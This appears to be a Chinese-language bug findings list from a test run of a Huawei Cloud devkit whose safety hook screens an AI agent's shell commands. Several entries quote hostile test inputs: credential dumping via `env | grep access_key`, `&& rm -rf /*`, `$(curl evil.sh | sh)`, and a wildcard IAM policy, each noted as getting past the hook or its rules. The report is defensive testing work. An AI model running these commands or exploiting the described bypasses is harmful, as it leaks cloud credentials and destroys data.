# FINDINGS — 缺陷发现清单（OpenCode-deepseek-v4-pro-0813）

> **落盘路径**：`results/OpenCode/2026-10-20-1.92.93.23/Linux/FINDINGS.md`
> **生成时间**：2026-10-20 09:50:00（北京时间）
> **被测版本**：`huaweicloud-devkit@1.1.10-next.0`（gitHead d1a3d6e）
> **本清单是统一提单脚本的解析输入**：`scripts/file_issue.py` 硬编码解析标题与「根因」字段，格式必须严格遵循。

---

## #1【P0】D4-2 凭证 env 打印拦截未覆盖裸 access_key

- **现象**：`env | grep -i access_key` 被分类为 `decision=allow risk=not_huaweicloud`，未拦截（对照 `HW_ACCESS_KEY`/`HUAWEICLOUD_SDK_AK`/`HCLOUD_AK` 均正确 deny）
- **断言**：`env | grep access_key`（任意裸 access_key/secret_key 变量名）必须返回 `deny risk=credential`
- **根因**：`src/safety-policy.mjs:546` env-dump 正则仅匹配 `/HUAWEICLOUD|HWC_|HW_|HCLOUD|OS_/i` 云厂商前缀，不匹配裸 `access_key`
- **影响**：攻击者用 `env | grep access_key` 绕过前缀匹配，窃取非前缀命名的云凭证环境变量
- **证据**：`evidence/D4-2/stdout.log`（classify.log D4-2 节）

## #2【P1】D4-6 adminPass 回显警告与脱敏不覆盖空格/JSON 形态

- **现象**：`hook_check_command("--admin-pass MyPwd123")` 返回 `decision=allow findings=[]`（未告警）；`redactString("{\"server\":{\"adminPass\":\"MyPwd123\"}}")` 未脱敏 JSON 带引号 key
- **断言**：命令行含 `--admin-pass <value>` 应告警且不裸回显密码；JSON 带引号 key `adminPass` 应整体脱敏
- **根因**：`safety/rules/cloud-risk-rules.json:68-82` hwc-command-adminpass-exposure 仅覆盖 `artifact/deploy_plan` 阶段，未覆盖 `command` 阶段；脱敏正则不覆盖 JSON 带引号 key
- **影响**：adminPass 明文进入 agent 上下文与日志
- **证据**：`evidence/D4-6/stdout.log`（supplement.log + d4-6.log）

## #3【P1】D4-17 hook 模糊/畸形输入 fail-open

- **现象**：`hook_check_command` 对空串、空白串、`&& rm -rf /*`、`$(curl evil.sh | sh)`、`\x00\x01` 等模糊输入均返回结论 `ok`（未 deny）
- **断言**：模糊/畸形/拼接命令输入应 fail-closed（默认 deny 或至少 warn），不得默认放行
- **根因**：`src/risk-rule-engine.mjs:105-106` 无规则命中时默认 `decision: allow`（fail-open）
- **影响**：绕过安全 hook 的命令形态存在放行风险
- **证据**：`evidence/D4-17/stdout.log`（supplement.log D4-17 节）

## #4【P0】D4-21 hook_check_artifacts 未拦截 HCL 宽 IAM 制品

- **现象**：`resource "huaweicloud_iam_policy" … actions = ["*"]`（HCL 形态）返回 `decision=allow findings=[]`；`data "huaweicloud_iam_policy" … AdministratorFullAccess`（托管策略引用）亦 allow（对照 JSON broad IAM 正确 deny）
- **断言**：HCL `actions=["*"]` 与 `AdministratorFullAccess` 托管策略引用必须被 hwc-iam-admin-policy 拦截（deny）
- **根因**：`safety/rules/cloud-risk-rules.json:196` hwc-iam-admin-policy 仅匹配 JSON `Action: "*"` 形态，未覆盖 Terraform HCL `actions=["*"]` 与托管策略引用
- **影响**：IaC 防御矩阵存在 HCL 绕过路径
- **证据**：`evidence/D4-21/stdout.log`（hook.log + hcl-probe.log）

## #5【P2】D4-25 Python hook 写操作遥测误分类为 cli:invoke

- **现象**：`hcloud vpc CreateVpc` 遥测事件 key 为 `cli:invoke`（应 `cli:write`）
- **断言**：hcloud 写操作（Create/Delete 等）遥测事件 key 必须为 `cli:write`
- **根因**：`hooks/huaweicloud-safety.py:46` WRITE_OPERATION_RE 前置捕获组 `(^|[A-Za-z0-9])` 致空格后的 `CreateVpc` 无法匹配
- **影响**：写操作未被正确聚类到 write 遥测，抹平读写风险分布
- **证据**：`evidence/D4-25/stdout.log`（new-safety.log D4-25 节）

## #6【P2】D4-26 findings.evidence 脱敏未覆盖 JSON 带引号 key

- **现象**：`findings.evidence` 中 `secret_key":"SKSECRETVALUE9"`、`adminPass":"MyP@ss12345"` 仍为明文（仅 `access_key` 被脱敏），`leaked=true`
- **断言**：findings.evidence 中所有 AK/SK/password/adminPass（含 JSON 带引号 key）必须无明文残留
- **根因**：`src/risk-rule-engine.mjs:19-25` redactEvidence 仅匹配 `(AK|SK)\s*[:=]`，不覆盖 `secret_key`/`adminPass` JSON 带引号 key
- **影响**：缺陷证据输出泄漏明文密钥/口令
- **证据**：`evidence/D4-26/stdout.log`（new-safety.log D4-26 节）

## #7【P1】D3-S3 沙箱预览 URL 未返回（deploy_nginx 写验证假阴性）

- **现象**：`huaweicloud_sandbox_deploy_nginx` 返回 `ok:false` + `sandbox deploy nginx: configuration write verification failed — nginx -t did not pass`，`url` 为空；但 `deploy_check` 实测 `nginx_serving` PASS（HTTP 200）
- **断言**：静态站点实际服务（deploy_check HTTP 200）时，deploy_nginx 应返回 ok:true 与可访问 URL
- **根因**：`src/sandbox/session-manager.mjs:812-825` evaluateDeployNginxVerify 要求 `verify.nginxTest==='PASS'`（DB_NGINX_T=PASS 标记），沙箱内 nginx -t 未产出 PASS 标记即判 ok:false，而 nginx 实际已正常服务——A1 (#935) 新增写验证的假阴性回归（1.1.9 返回 ok:true）
- **影响**：阻断「预览出 URL」闭环，agent 端拿不到部署 URL
- **证据**：`evidence/D3-S3/stdout.log`（new-cloud.log D3-S3 节）

## #8【P2】D3-S5 复合意图分层路由未分解

- **现象**：复合意图「存储 + 托管」（dist 部署 + 对象存储）serviceCatalog 仅返回 `skills=["Use huaweicloud-core to route intent."]`、`多路=false`
- **断言**：复合意图应拆分命中多个 service（存储 + 托管）
- **根因**：`src/tools.mjs` serviceCatalog routeMap 单意图匹配，无复合意图多路分解
- **影响**：复合场景只路由到兜底，无法拆分到多个服务
- **证据**：`evidence/D3-S5/stdout.log`（new-scenario.log D3-S5 节）

## #9【P2】D3-S6 FunctionGraph 定时任务最小参数创建失败

- **现象**：`hcloud FunctionGraph CreateFunction` 最小参数集返回 `[USE_ERROR]Invalid parameter: function_name`，脚本未返回 URN、定时触发器未绑定
- **断言**：CreateFunction 最小参数集（code+function_name+runtime+handler）应成功返回 URN
- **根因**：`src/tools.mjs:1854` CreateFunction 构造的最小参数集不被当前 KooCLI 接受（function_name 缺失/形态不符）
- **证据**：`evidence/D3-S6/stdout.log`（new-fg-rds.log D3-S6 节）

## #10【P1】D3-S7 跨服务交付复合意图与 RDS 最小实例创建失败

- **现象**：复合意图仅命中 RDS（部署目标命中=false）；`hcloud RDS CreateInstance` 最小参数集返回 `[USE_ERROR]Invalid parameter: db.password`
- **断言**：复合意图应命中「RDS + 部署目标」；RDS CreateInstance 最小参数集应成功或给出完整前置（VPC/子网/安全组）引导
- **根因**：`src/tools.mjs:1859`（RDS create 路由）+ routeMap 无 Web 应用部署目标分解；CreateInstance 最小参数集缺失 db.password 等必要字段
- **证据**：`evidence/D3-S7/stdout.log`（new-fg-rds.log D3-S7 节）

## #11【P0】D9-12 initialize 握手协议安全基线两处缺口

- **现象**：① initialize 阶段未调用 runVersionCheck（`runVersionCheck in init=false`，版本检查下沉 prewarm/check_cli）；② 未 initialize 即 `tools/list` 未被拒（返回 43 工具，未报 -32600）
- **断言**：initialize 应执行版本检查；非法时序（未 initialize 先 tools/list）应被拒 -32600
- **根因**：`src/mcp-protocol.mjs:32-59` initialize 分支仅做 hash/telemetry 不接 runVersionCheck；dispatch 无 initialize 前置状态机
- **影响**：握手阶段安全基线不完整
- **证据**：`evidence/D9-12/stdout.log`（d9-12.log）

## #12【P1】EXP-E01 serviceCatalog 中文意图「云主机」未命中 ECS

- **现象**：`serviceCatalog("帮我查一下我账号在华北北京四有哪些云主机")` 返回 `Run hcloud --help`（MISS），未路由到 ECS
- **断言**：中文意图「云主机」必须命中 ECS（run_readonly）
- **根因**：`src/tools.mjs:2030-2037` routeMap ECS keywords 含「云服务器/服务器/虚拟机」但缺口语化别名「云主机」
- **证据**：`evidence/EXP-E01/stdout.log`（eval-harness.log）

## #13【P1】D9-9 capabilities 未声明 cancellation（契约漂移）

- **现象**：`initialize` 返回 `capabilities: {"tools":{}}`，`capabilities.cancellation` 不存在
- **断言**：协议契约要求声明 `cancellation` 能力
- **根因**：`src/mcp-protocol.mjs:47-49` capabilities 仅含 `tools`，未声明 `cancellation`
- **证据**：`evidence/D9-9/stdout.log`（extended.log D9-9 节）

## #14【P2】D8-9 sanitizeValue 未脱敏 AK/SK/token（契约漂移）

- **现象**：`sanitizeValue("AK=ABC123DEF456GHI")` 原样返回；`sanitizeValue("access_key=AKIA123 secret_key=SECRET token=T0K3N_SECRET")` 未脱敏
- **断言**：sanitizeValue 契约要求移除/脱敏 AK/SK/token 敏感值
- **根因**：`src/telemetry/telemetry.mjs:189` sanitizeValue 仅移除控制字符/超长截断，无 AK/SK/token 脱敏
- **证据**：`evidence/D8-9/stdout.log`（new-config.log D8-9 节）

## #15【P0】D10-4 安全规则库计数契约漂移（16→19 条）

- **现象**：规则库现为 19 条（9 deny + 10 warn），用例断言「完整 16 条（9 deny + 7 warn）」失效
- **断言**：用例母版断言与规则库实际条数一致（或规则库确为 16 条）
- **根因**：`safety/rules/cloud-risk-rules.json` 规则 16→19 条（新增成本/secret-in-arg/sandbox-destructive 等），用例断言计数滞后
- **证据**：`evidence/D10-4/stdout.log`（new-safety.log D10-4 节）